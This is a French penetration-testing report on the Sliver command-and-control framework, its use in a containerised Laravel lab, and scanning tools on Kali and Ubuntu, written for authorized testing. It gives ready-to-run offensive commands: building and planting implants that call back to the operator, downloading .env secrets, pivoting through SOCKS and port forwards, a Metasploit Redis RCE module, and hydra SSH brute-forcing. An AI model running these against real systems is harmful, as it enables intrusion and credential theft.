# Rapport — Sliver, tests d'intrusion et outillage

**Date** : 2026-11-12
**Auteur** : Mxlione
**Sujet** : comprendre Sliver (C2), son usage en local sur un projet Laravel + microservices, ce qu'il reçoit réellement, et l'outillage de test d'intrusion associé (Kali / Ubuntu).
**Portée** : documentation technique et cadrage méthodologique. Tous les tests décrits visent des systèmes possédés ou explicitement autorisés par écrit.

---

## Sommaire

1. [Sliver : ce que c'est](#1-sliver--ce-que-cest)
2. [Architecture](#2-architecture)
3. [Ce que Sliver n'est PAS](#3-ce-que-sliver-nest-pas)
4. [Fonctionnement en local (Laravel + microservices)](#4-fonctionnement-en-local-laravel--microservices)
5. [Peut-on lui fournir l'URL d'un projet déployé ?](#5-peut-on-lui-fournir-lurl-dun-projet-déployé-)
6. [Ce que Sliver reçoit réellement](#6-ce-que-sliver-reçoit-réellement)
7. [La chaîne complète d'un test](#7-la-chaîne-complète-dun-test)
8. [Scanners et outils : rôles et limites](#8-scanners-et-outils--rôles-et-limites)
9. [Disponibilité des outils : Kali vs Ubuntu](#9-disponibilité-des-outils--kali-vs-ubuntu)
10. [Recon avec une IP seule](#10-recon-avec-une-ip-seule)
11. [Vérification de l'environnement (gh, Go, Sliver)](#11-vérification-de-lenvironnement-gh-go-sliver)
12. [Recommandations et cadre](#12-recommandations-et-cadre)
13. [Annexe — commandes prêtes à l'emploi](#13-annexe--commandes-prêtes-à-lemploi)

---

## 1. Sliver : ce que c'est

**Sliver** (BishopFox, licence GPLv3) est un framework open-source de **command-and-control (C2)** et d'**émulation d'adversaire**, destiné aux tests d'intrusion autorisés.

Caractéristiques principales :

- Implants **cross-platform** (Windows, Linux, macOS ; amd64 et arm64), compilés dynamiquement en Go.
- Clés asymétriques **uniques par binaire** généré.
- C2 sur **mTLS**, **WireGuard**, **HTTP(S)** et **DNS**, avec stratégie de connexion séquentielle ou aléatoire.
- Post-exploitation : shell, transfert de fichiers, pivots, port forwarding, SOCKS5, BOF/COFF, extensions, stagers, backdoors, injection de processus.
- Deux modes d'implant :
  - **Session** : canal interactif temps réel (type shell).
  - **Beacon** : check-in asynchrone avec intervalle + jitter, file de tâches FIFO, résultats récupérables ; convertible en session via `interactive`.
- Console **serveur** = sur-ensemble de la console **client**.
- API entièrement **gRPC**, ce qui permet le mode multi-opérateurs et l'automatisation (scripts `rc`, `sliver-client implant`, serveur MCP pour un agent IA).

Le dépôt analysé : `BishopFox/sliver`, commit `6ccfd6a25`, branche par défaut, build via `Makefile` (Go ≥ 1.27.3).

---

## 2. Architecture

Quatre composants :

```
             In         ┌───────────────┐ C2 (mTLS/WG/HTTP/DNS)
┌─────────┐  Memory     │               │            ┌─────────┐
│ Server  ├────────────►│ Sliver Server ├───────────►│ Implant │
│ Console │             │               │            └─────────┘
└─────────┘             └───────────────┘
                               ▲
                               │ gRPC/mTLS (multiplayer)
                          ┌────┴────┐
                          │ Sliver  │
                          │ Client  │
                          └────┘────┘
```

| Composant | Rôle |
|---|---|
| `sliver-server` | Gère la base, les autorités de certification, les listeners C2, l'API gRPC. Lance aussi la console serveur (via gRPC **en mémoire**). |
| `sliver-client` | Console cliente, se connecte au gRPC distant (multiplayer) ou local. |
| Implant | Le binaire exécuté sur la cible. |
| `protobuf/` | Contrats gRPC partagés (`commonpb`, `sliverpb`, `clientpb`, `rpcpb`, `dnspb`). |

Mapping du dépôt :

| Dossier | Contenu |
|---|---|
| `server/c2/` | Listeners (mTLS, WireGuard, HTTP(S), DNS) |
| `server/db/`, `server/certs/` | Persistance, PKI |
| `server/builder/`, `server/generate/` | Compilation des implants |
| `server/rpc/` | Implémentation gRPC |
| `server/ai/` | Boucle agentique (assistance IA) |
| `client/command/` | Une sous-commande par dossier (`generate`, `jobs`, `beacons`, `filesystem`, `pivots`, `armory`, `mcp`…) |
| `implant/sliver/` | Runtime de l'implant (transports, taskrunner, handlers, priv, syscalls) |
| `docs/sliver-docs/` | Site de documentation (Next.js) |

### Ports par défaut

| Transport | Port |
|---|---|
| mTLS C2 | TCP 8888 |
| WireGuard (UDP tunnel) | UDP 53 |
| WireGuard — key exchange | TCP 1337 (dans le tunnel) |
| WireGuard — comms C2 | TCP 8888 (dans le tunnel) |
| HTTP(S) | 80 / 443 (configurable) |
| Multiplayer (gRPC) | 31337 |

---

## 3. Ce que Sliver n'est PAS

Point central, souvent mal compris :

> **Sliver ne scanne rien, ne détecte aucune faille, et n'exploite aucune CVE. C'est un framework de post-exploitation.**

| Scanner (ZAP, nuclei…) | Sliver |
|---|---|
| Entrée : une adresse (URL/IP) | Entrée : un binaire que l'opérateur fabrique |
| Envoie du trafic **vers** la cible | **Attend** que la cible appelle |
| Découvre des failles | Exécute des commandes sur une machine déjà compromise |
| Sortie : un rapport | Sortie : une session distante |

Conséquences directes :

- Pas de crawler, pas de fuzzer HTTP, pas de module Laravel/PHP.
- Aucun champ « target » dans son API.
- Sans exécution du binaire sur la cible, le serveur ne reçoit **rien**.

---

## 4. Fonctionnement en local (Laravel + microservices)

Oui, Sliver est utilisable sur un projet local — à condition de comprendre qu'il intervient **après** l'obtention d'un accès, et que cet accès est simulé/fourni par l'opérateur.

### Scénario de lab

**1. Serveur + listener sur l'hôte**

```bash
./sliver-server
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > jobs
```

**2. Générer un implant pour les conteneurs**

```bash
sliver > generate --mtls <IP_HOTE_VUE_DU_CONTENEUR> --os linux --arch amd64 --save ./lab
```

L'adresse de callback n'est **jamais** `localhost` : dans un conteneur, `localhost` désigne le conteneur lui-même.

| Contexte | Adresse de callback |
|---|---|
| Docker bridge par défaut | `172.17.0.1` (gateway — vérifier avec `docker network inspect bridge`) |
| Docker Desktop | `host.docker.internal` |
| Réseau compose custom | IP de la gateway du réseau, ou `--network host` pour le conteneur de test |

Le conteneur doit pouvoir **sortir** (pas de réseau `internal: true`, pas d'egress bloquant).

**3. Faire entrer l'implant**

C'est l'étape non automatisée par Sliver — le « foothold » :

```bash
docker cp ./lab/IMPLANT app-php:/tmp/i
docker exec app-php chmod +x /tmp/i
docker exec -d app-php /tmp/i
```

En lab, `docker exec` revient à jouer l'attaquant disposant déjà d'une RCE. En exercice réaliste, l'entrée passe par une route vulnérable, un upload, une CVE.

**4. Interagir**

```bash
sliver > sessions          # ou: beacons
sliver > use <id>
sliver (NOM) > ls
sliver (NOM) > download .env      # démonstration : APP_KEY, DB_PASSWORD
```

**5. Pivot vers les microservices**

C'est l'apport réel de Sliver : le conteneur compromis sert de point d'appui vers ce qui n'est pas exposé.

```bash
sliver (app) > portfwd add --remote db:3306 --bind 127.0.0.1:13306
sliver (app) > socks5 start
sliver (app) > pivots
```

Objectif de démonstration : prouver qu'une RCE dans le conteneur PHP donne accès à la maille interne (base, Redis, queues, services non exposés), pas seulement au conteneur.

### Limites opérationnelles

| Limite | Détail |
|---|---|
| Pas d'exploit Laravel | Aucune CVE, aucun payload PHP |
| Binaire Go volumineux | Plusieurs Mo ; OK sur Debian/Alpine (statique), mais image `scratch`/`distroless` sans shell → `shell` inutilisable (`ls`, `download`, `upload`, `ps` restent fonctionnels) |
| Privilèges | Conteneur non-root ou rootfs read-only → de nombreuses actions échouent |
| Commandes Windows-only | `getsystem`, `impersonate`, `make-token` |
| Format | Rester en `EXECUTABLE` (défaut) en Linux |
| DNS C2 | Nécessite un domaine + serveur DNS autoritaire → inutilisable en local pur |
| WireGuard | UDP 53 souvent occupé/privilégié → préférer mTLS ou HTTP en local |
| Obfuscation | `garble` gourmand ; en lab, build debug et sans obfuscation de symboles pour accélérer et faciliter le diagnostic |

---

## 5. Peut-on lui fournir l'URL d'un projet déployé ?

**Non.** Sliver n'accepte pas d'URL de cible.

Une URL n'entre dans Sliver que dans **un seul rôle** : l'adresse C2 que l'opérateur contrôle, c'est-à-dire là où l'implant va rappeler.

| Commande | Signification réelle |
|---|---|
| `generate --http https://mon-projet.com` | ❌ Pas « cible mon-projet.com ». L'implant **appellera** cette URL ; le domaine doit appartenir à l'opérateur et pointer vers son serveur. |
| `https --domain cdn.mondomaine.com --website ./decoy` | ✅ Listener C2 déguisé derrière un site leurre hébergé par l'opérateur. |
| `stage-listener --url https://cdn.mondomaine.com/app.js` | ✅ Sert un stager depuis le serveur de l'opérateur. |
| `generate --mtls 1.2.3.4:8888` | ✅ Callback mTLS vers l'infrastructure de l'opérateur. |

Dans les cas valides, l'URL est **l'infrastructure de l'opérateur**, jamais la cible.

### Le seul chemin « URL → Sliver »

Il passe par une faille, pas par un flag :

```
URL de l'app déployée
   │
   ├─ 1. Recon / DAST : trouver une entrée
   │      ZAP, nuclei, ffuf, wapiti, Burp, nikto
   │      Laravel : APP_DEBUG=true, .env exposé, /telescope, /horizon,
   │      /storage/logs/laravel.log, routes API sans authz, upload non filtré…
   │
   ├─ 2. Obtenir une exécution de code ou un upload exécutable
   │
   └─ 3. Déposer et lancer l'implant → Sliver prend le relais (C2, pivot, loot)
```

Sans l'étape 2, Sliver ne peut rien faire sur cette URL.

---

## 6. Ce que Sliver reçoit réellement

Trois moments distincts :

### 6.1 Avant — la configuration de génération (entrée du build)

L'opérateur fournit : protocole C2 + adresse de **son** serveur, OS/arch, mode session/beacon, intervalle/jitter, limites. La sortie est un implant autonome contenant les clés et l'adresse de rappel.

```bash
sliver > generate --mtls 10.0.0.5:8888 --os linux --arch amd64
# → ./SOME_CODENAME  (binaire autonome, clés embarquées)
```

### 6.2 Pendant — le premier paquet `Register`

Dès l'exécution de l'implant sur la cible, **c'est l'implant qui ouvre la connexion** vers le serveur. Le serveur reçoit ce message (`protobuf/sliverpb/sliver.proto`) :

```protobuf
message Register {
  string Name = 1;
  string Hostname = 2;
  string Uuid = 3;
  string Username = 4;
  string Uid = 5;
  string Gid = 6;
  string Os = 7;
  string Arch = 8;
  int32  Pid = 9;
  string Filename = 10;
  string ActiveC2 = 11;
  string Version = 12;
  int64  ReconnectInterval = 13;
  string ProxyURL = 14;
  string ConfigID = 16;
  int64  PeerID = 17;
  string Locale = 18;
  uint64 Capabilities = 19;
}
```

C'est **tout** ce que le serveur apprend à cet instant : identité machine/utilisateur/processus et canal utilisé. Rien sur l'application, ses routes ou ses ports.

Affichage côté opérateur :

```text
[*] Session 8ff2ce4c LONG_DRAMATURGE - 10.0.0.42:57154 (web-php) - linux/amd64
```

### 6.3 Après — des allers-retours de tâches

```
opérateur ──gRPC──► serveur ──tâche──► implant ──exécution locale──► cible
                          ◄──résultat──          ◄──sortie──
```

Le serveur reçoit ensuite : résultats de commandes, check-ins de beacon, nouvelles sessions. Rien d'autre.

### Synthèse

```
        ┌──────────────┐  1. compilation d'un implant
        │  OPÉRATEUR   │────────────────────────────► [ IMPLANT ]
        └──────┬───────┘                                   │
               │ commandes (gRPC)                          │ 2. exécution sur la cible
               ▼                                           ▼
        ┌──────────────┐  3. callback sortant      ┌──────────────┐
        │   SERVEUR    │◄──────────────────────────│    CIBLE     │
        │    SLIVER    │  Register + résultats     │  (conteneur) │
        └──────────────┘                           └──────────────┘
```

La flèche 3 part **de la cible vers l'opérateur** : d'où le fonctionnement derrière NAT, firewall ou conteneur, et l'impossibilité d'« attaquer une URL ».

**Les limites de l'action sont fixées à la compilation** : protocoles embarqués, canaries, intervalle/jitter, extensions autorisées. Un implant compilé sans `--http` ne parlera jamais HTTP, même avec un listener HTTP actif.

---

## 7. La chaîne complète d'un test

| Phase | Objectif | Outils |
|---|---|---|
| 1. Cadrage | Périmètre écrit, fenêtre, contacts | — |
| 2. Recon | Cartographier surface et services | `nmap`, `masscan`, `naabu`, `whatweb`, `dig` |
| 3. Découverte de chemins | Trouver les endpoints | `ffuf`, `feroxbuster`, `gobuster` |
| 4. Scan applicatif | Failles génériques | ZAP, nuclei, nikto, wapiti |
| 5. Test d'API | Validation, mass assignment, 500 | schemathesis, `curl`, tests manuels |
| 6. Code & dépendances | CVE, secrets, patterns dangereux | `composer audit`, `trivy`, `semgrep`, `gitleaks`, Psalm taint |
| 7. Manuel | IDOR, authz, logique métier | Revue de code + scénarios |
| 8. Post-exploitation | Impact réel | **Sliver** (lab, après accès) |
| 9. Rapport | Findings + remédiation | — |

---

## 8. Scanners et outils : rôles et limites

| Outil | Type | Ce qu'il fait | Ce qu'il ne fait pas |
|---|---|---|---|
| **OWASP ZAP** | DAST | Crawle, teste injections/XSS/CSRF/headers, rejoue les formulaires | Logique métier, IDOR fiable ; bruyant et lent en full scan |
| **nuclei** | Scanner à templates | Envoie des requêtes ciblées : CVE, fichiers exposés, misconfig, logins par défaut | Crawl profond ; ne trouve que ce qui a un template |
| **ffuf / feroxbuster** | Brute-force de chemins | Découvre `/admin`, `/api`, `/telescope`, backups, `.git` | Ne teste pas les failles |
| **schemathesis** | Fuzzing d'API | Génère des requêtes depuis OpenAPI, cherche 500/400/leaks | Nécessite une spec à jour |
| **wapiti / nikto** | DAST légers | Passifs + checks rapides | Profondeur |
| **testssl.sh** | TLS | Protocoles/chiﬀres faibles | Applicatif |
| **sqlmap** | Injection SQL | Détecte/exploite les SQLi | Nécessite un paramètre injectable (URL, pas IP) |
| **trivy** | SCA / images / IaC | CVE des dépendances et images, misconfig | Logique applicative |
| **semgrep / Psalm taint** | SAST | Patterns dangereux, flux de données non fiables | Faux positifs, à trier |
| **gitleaks** | Secrets | Secrets commités dans l'historique | Secrets uniquement en runtime |

### Ordre de bataille recommandé (app déployée)

**1. Recon non destructif**

```bash
curl -sI https://ton-projet.com
curl -s https://ton-projet.com/robots.txt
curl -s https://ton-projet.com/up            # health check Laravel
curl -s https://ton-projet.com/telescope
curl -s https://ton-projet.com/horizon
curl -s https://ton-projet.com/.env
```

Un `APP_DEBUG=true` en production expose stack traces, variables et parfois des credentials : ce seul contrôle vaut plus que la majorité d'un scan générique.

**2. Nuclei**

```bash
nuclei -update-templates
nuclei -u https://ton-projet.com -severity critical,high -tags cve,exposure,misconfig,default-login
nuclei -tl | grep -i laravel
nuclei -l urls.txt -severity critical,high,medium -jsonl -o nuclei.jsonl
```

**3. Découverte de chemins**

```bash
ffuf -u https://ton-projet.com/FUZZ -w /usr/share/wordlists/dirb/common.txt \
     -mc 200,301,302,403 -rate 20
```

Cibles Laravel typiques : `/storage/logs/laravel.log`, `/vendor/`, `/composer.json`, `/composer.lock`, `/phpinfo.php`, `/api/documentation`, `/docs`, `/sanctum/csrf-cookie`.

**4. ZAP — passif puis actif**

```bash
# Baseline (~5 min, peu intrusif)
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://ton-projet.com -r zap-baseline.html

# Full scan : staging uniquement
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \
  zap-full-scan.py -t https://ton-projet.com -r zap-full.html
```

⚠️ Le full scan **remplit des formulaires, crée et supprime des enregistrements** : jamais sur une production avec de vraies données.

⚠️ Sur une app authentifiée, ZAP exige un **contexte** (cookie ou Bearer). Sans cela, il ne teste que la page de login.

**5. API**

```bash
schemathesis run https://api.ton-projet.com/openapi.json \
  --base-url https://api.ton-projet.com \
  --header "Authorization: Bearer $TOKEN" \
  --checks all --max-examples 50
```

**6. Code, dépendances, images**

```bash
composer audit
composer outdated --direct
trivy fs . --severity HIGH,CRITICAL
trivy image --severity HIGH,CRITICAL ton-image-php:tag
trivy config docker-compose.yml
gitleaks detect --source . -v
semgrep --config p/php --config p/security-audit .
psalm --taint-analysis
phpstan analyse --level max
```

### Ce que les scans ne verront jamais

| Trou | Pourquoi | Comment |
|---|---|---|
| IDOR / authz horizontale | Nécessite deux comptes et de la logique | Manuel |
| Escalade métier | Pas de signature technique | Revue des policies Laravel |
| Secrets dans les logs | Contenu applicatif | `storage/logs`, stack traces |
| Services internes non authentifiés | Réseau interne | Test depuis un conteneur |
| Logique de paiement/workflow | Aucun scanner ne la modélise | Revue + scénarios |

C'est précisément là que Sliver reprend la main : un trou donnant une exécution de code permet de vérifier ce que l'attaquant verrait **de l'intérieur**. Sliver ne trouve pas le trou, il l'exploite.

---

## 9. Disponibilité des outils : Kali vs Ubuntu

### Sur Kali

Le métapaquet `kali-tools-web` (inclus dans l'ISO par défaut) fournit :

| Préinstallé | Paquets |
|---|---|
| ZAP, Burp Community, sqlmap, nikto, wapiti, whatweb, wafw00f, wpscan, dirb, gobuster, **ffuf**, testssl.sh, sslscan | `zaproxy`, `burpsuite`, `sqlmap`, `nikto`, `wapiti`, `ffuf`, `testssl.sh`… |
| nmap, masscan | `nmap`, `masscan` |
| nuclei, subfinder, httpx (**`httpx-toolkit`** — nom renommé) | dépôts Kali |
| feroxbuster | `feroxbuster` |

**Non préinstallés même sur Kali** : `schemathesis`, `semgrep`, `trivy`, `gitleaks`, `psalm`, `phpstan`.

### Sur la machine utilisée (Ubuntu 24.04.5)

État réel constaté :

| Déjà installé | Manquant |
|---|---|
| `nuclei` `sqlmap` `gobuster` (`~/.local/bin`), `nikto` `nmap` (`/usr/bin`), `composer` `docker` (`/usr/bin`) | `zaproxy` `ffuf` `feroxbuster` `wapiti` `testssl.sh` `trivy` `semgrep` `gitleaks` `schemathesis` |

Go : `~/go/bin/go` en **1.27.3**, mais absent du `PATH`.

### Installation sur Ubuntu

```bash
sudo apt update
sudo apt install -y zaproxy ffuf wapiti testssl.sh nikto

# feroxbuster : binaire release
curl -sL https://github.com/epi052/feroxbuster/releases/latest/download/x86_64-linux-feroxbuster.tar.gz \
  | tar xz -C /tmp && sudo mv /tmp/feroxbuster /usr/local/bin/

# trivy
sudo apt install -y wget gnupg
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo gpg --dearmor -o /usr/share/keyrings/trivy.gpg
echo "deb [signed-by=/usr/share/keyrings/trivy.gpg] https://aquasecurity.github.io/trivy-repo/deb generic main" \
  | sudo tee /etc/apt/sources.list.d/trivy.list
sudo apt update && sudo apt install -y trivy

# python
sudo apt install -y pipx && pipx ensurepath
pipx install schemathesis
pipx install semgrep

# go
export PATH="$HOME/go/bin:$PATH"
go install github.com/gitleaks/gitleaks/v8@latest
```

### Alternative sans installation : Docker

```bash
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t https://ton-projet.com -r /zap/wrk/out.html

docker run --rm -v "$HOME/.nuclei:/root/.nuclei" \
  projectdiscovery/nuclei:latest -u https://ton-projet.com -severity critical,high

docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  aquasec/trivy image --severity HIGH,CRITICAL ton-image-php:tag

docker run --rm -v "$PWD:/src" returntocorp/semgrep \
  semgrep --config p/php --config p/security-audit /src

docker run --rm schemathesis/schemathesis:stable \
  run https://api.ton-projet.com/openapi.json --checks all
```

---

## 10. Recon avec une IP seule

**Aucun outil ne prend une IP et « trouve + exploite » automatiquement.** La chaîne réelle : découvrir → identifier → chercher l'exploit → tenter, uniquement si un service est réellement vulnérable.

### Cartographie

```bash
nmap -Pn -sS -p- --min-rate 2000 -oA scan_all 1.2.3.4
nmap -Pn -sV -sC -p 22,80,443,3306,6379 -oA scan_svc 1.2.3.4
nmap -Pn --script vuln 1.2.3.4          # bruyant
masscan -p1-65535 --rate 5000 1.2.3.4
rustscan -a 1.2.3.4 -- -sV -sC
naabu -host 1.2.3.4 -top-ports 1000
```

### Identification applicative

```bash
whatweb http://1.2.3.4
wafw00f http://1.2.3.4
nikto -h http://1.2.3.4
nuclei -u http://1.2.3.4 -severity critical,high
testssl.sh 1.2.3.4:443
```

### Port → outil adapté

| Port | Service | Outil | Ce qu'il donne |
|---|---|---|---|
| 22 | SSH | `ssh-audit 1.2.3.4` | Algorithmes faibles, bannière |
| 80/443 | HTTP(S) | `nikto`, `nuclei`, `ffuf`, `zaproxy` | Chemins, CVE, misconfig |
| 139/445 | SMB | `enum4linux-ng -A 1.2.3.4` | Users, groupes, partages |
| 161 | SNMP | `snmp-check 1.2.3.4`, `onesixtyone` | Community string, infos système |
| 389/636 | LDAP | `ldapsearch -x -H ldap://1.2.3.4` | Annuaire anonyme |
| 1433 | MSSQL | `netexec mssql 1.2.3.4`, `impacket-mssqlclient` | Auth, exécution |
| 3306 | MySQL | `mysql -h 1.2.3.4 -u root` | Accès si root sans mot de passe |
| 5432 | PostgreSQL | `psql -h 1.2.3.4 -U postgres` | Idem |
| **6379** | **Redis** | `redis-cli -h 1.2.3.4 info` | **Souvent sans auth → lecture/écriture totale** |
| 9200 | Elasticsearch | `curl 1.2.3.4:9200/_cat/indices` | Dump complet |
| **2375** | **Docker API** | `curl 1.2.3.4:2375/version` | **Sans TLS = RCE (conteneur privilégié)** |
| 2049 | NFS | `showmount -e 1.2.3.4` | Partages exportés |
| 5985/5986 | WinRM | `netexec winrm 1.2.3.4` | Auth + exec |
| 21 | FTP | `ftp 1.2.3.4` (anonymous) | Dépôt anonyme |
| 11211 | Memcached | `nc -v 1.2.3.4 11211` | Cache exposé |

Ces lignes constituent les vrais « jackpots » : services exposés sans authentification, exploitables sans CVE.

### Si un service est vulnérable

```bash
searchsploit apache 2.4.49
msfconsole
  msf > db_nmap -sV -p- 1.2.3.4
  msf > search type:exploit name:redis
  msf > use exploit/linux/redis/redis_replication_cmd_exec
  msf > set RHOSTS 1.2.3.4
  msf > run

hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://1.2.3.4
netexec ssh 1.2.3.4 -u users.txt -p pass.txt
```

### Limite majeure : une IP n'est pas une URL

Sur un projet Laravel déployé, l'IP mène presque toujours à un **reverse proxy / CDN** :

- le vhost est sélectionné par `Host` ou le **SNI TLS** → sans le bon domaine, réponse 404 par défaut ;
- le WAF/CDN peut filtrer selon le Host ;
- plusieurs applications peuvent partager la même IP.

```bash
dig -x 1.2.3.4
nmap -Pn --script http-vhosts -p 80,443 1.2.3.4
curl -I -H "Host: ton-projet.com" http://1.2.3.4
nuclei -u http://1.2.3.4 -H "Host: ton-projet.com"
```

Un scan IP-only dira « Apache 2.4.x, PHP exposé, port 6379 ouvert » — jamais « `/api/invoices/{id}` ne vérifie pas le propriétaire ». L'applicatif exige **URL + session authentifiée**.

Par ailleurs, `nmap -sV` confond souvent les versions derrière un proxy, et les scanners produisent des faux positifs : chaque finding se confirme manuellement.

---

## 11. Vérification de l'environnement (gh, Go, Sliver)

### GitHub CLI

| Élément | Valeur |
|---|---|
| Binaire | `/usr/bin/gh` |
| Version | **2.45.0** (paquet Ubuntu, ESM) |
| Compte | **Mxlione** (actif) |
| Authentification | ✓ via keyring |
| Protocole git | **https** |
| Scopes du token | `gist`, `read:org`, `repo`, `workflow` |

Remarques :

- `workflow` présent → possibilité de pousser des fichiers `.github/workflows/*`.
- `read:org` en lecture seule → pas d'administration d'équipes.
- Version 2.45.0 plus ancienne que l'upstream : mettre à jour via le dépôt officiel `cli.github.com/packages` pour disposer des sous-commandes récentes.

### Autres éléments

| Élément | État |
|---|---|
| Sliver | dépôt cloné, commit `6ccfd6a25`, binaires non compilés |
| Go | 1.27.3 dans `~/go/bin`, **hors PATH** |
| `~/.sliver` | absent (serveur jamais lancé) |
| Réseau / listener | aucun listener C2 actif |

---

## 12. Recommandations et cadre

### Cadre juridique et opérationnel

- N'utiliser les outils offensifs que sur des systèmes **possédés** ou couverts par une **autorisation écrite** (périmètre, dates, contacts, adresses).
- Scanner une IP tierce, même avec `nmap`, constitue une atteinte à un système de traitement automatisé de données.
- Sliver est un outil de **post-exploitation** : il ne remplace ni un scanner, ni une revue de code.

### Recommandations techniques

1. **Prioriser les contrôles à fort rendement** avant tout scan lourd : `APP_DEBUG`, `.env`, `/telescope`, `/horizon`, `/storage/logs`, `/composer.lock`, routes sans middleware `auth`.
2. **DAST uniquement sur staging** avec snapshot de base ; jamais de full scan sur production avec données réelles.
3. **Toujours tester l'applicatif avec une session authentifiée** ; sinon 90 % de la surface reste invisible.
4. **Confirmer manuellement** chaque finding avant de le qualifier de faille.
5. **Conserver une baseline** (JSON/HTML) pour mesurer la remédiation.
6. **Réserver Sliver au lab** : un conteneur compromis volontairement, pour démontrer l'impact réel (accès DB, Redis, services internes via pivot).
7. **Ne jamais exécuter de push, déploiement ou action destructive** sans demande explicite.

---

## 13. Annexe — commandes prêtes à l'emploi

### Compiler et lancer Sliver (local)

```bash
export PATH="$HOME/go/bin:$PATH"
cd /path/to/sliver
make                      # → ./sliver-server ./sliver-client
./sliver-server           # console serveur, crée ~/.sliver/
```

### Lab conteneurisé

```bash
# serveur
./sliver-server
sliver > mtls --lhost 0.0.0.0 --lport 8888

# implant (hôte vu depuis le conteneur)
sliver > generate --mtls 172.17.0.1:8888 --os linux --arch amd64 --save ./lab

# déploiement simulé
docker cp ./lab/IMPLANT app-php:/tmp/i
docker exec app-php chmod +x /tmp/i
docker exec -d app-php /tmp/i

# post-exploitation
sliver > sessions
sliver > use <id>
sliver (app) > download .env
sliver (app) > portfwd add --remote db:3306 --bind 127.0.0.1:13306
sliver (app) > socks5 start
```

### Contrôles Laravel prioritaires

```bash
curl -sI  https://ton-projet.com
curl -s   https://ton-projet.com/.env | head
curl -s   https://ton-projet.com/telescope | head
curl -s   https://ton-projet.com/horizon | head
curl -s   https://ton-projet.com/storage/logs/laravel.log | head
curl -s   https://ton-projet.com/composer.lock | head
```

### Scans

```bash
nuclei -u https://ton-projet.com -severity critical,high -tags cve,exposure,misconfig
ffuf -u https://ton-projet.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403
nikto -h https://ton-projet.com
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py -t https://ton-projet.com
```

### Audit de code

```bash
composer audit
trivy fs . --severity HIGH,CRITICAL
gitleaks detect --source . -v
semgrep --config p/php --config p/security-audit .
psalm --taint-analysis
```

### Maintenance de l'outillage

```bash
export PATH="$HOME/go/bin:$PATH"
nuclei -update-templates
nuclei -version
for t in zaproxy ffuf feroxbuster nikto wapiti nuclei trivy semgrep gitleaks schemathesis testssl.sh; do
  printf "%-14s %s\n" "$t" "$(command -v $t || echo MANQUANT)"
done
```

---

*Fin du rapport.*
